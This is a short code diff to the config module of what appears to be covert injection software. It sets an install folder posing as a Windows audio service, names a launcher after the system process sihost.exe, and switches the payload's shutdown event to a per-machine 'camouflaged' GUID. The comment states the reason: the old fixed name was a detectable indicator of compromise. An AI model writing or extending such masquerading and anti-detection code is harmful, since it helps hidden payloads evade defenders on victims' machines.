@@ -121,9 +121,13 @@ module.exports = {
   // SVC_INSTALL_DIR).
   SVC_INSTALL_DIR: 'C:\\ProgramData\\WinAudioSvc',
 
-  // Named event created by the payload's shutdown watcher (SVC_SHUTDOWN_EVENT_NAME).
+  // Named event created by the payload's shutdown watcher.
   // The renderer polls OpenEvent on this to test "is payload injected?".
-  SVC_SHUTDOWN_EVENT: 'Global\\DwmCompositorShutdownRelease',
+  // v3 (2026-09-19): per-box derived, camouflaged GUID name -- must match
+  // the payload/launcher obf_event_shutdown() byte-for-byte (verified
+  // C/JS/PS identical). Was the fixed 'Global\DwmCompositorShutdownRelease'
+  // constant, a probe-able cross-install IOC.
+  SVC_SHUTDOWN_EVENT: require('../lib/obf-names').eventShutdown(),
 
   // Names of the C-side binaries we spawn.
   LAUNCHER_EXE:  'sihost.exe',
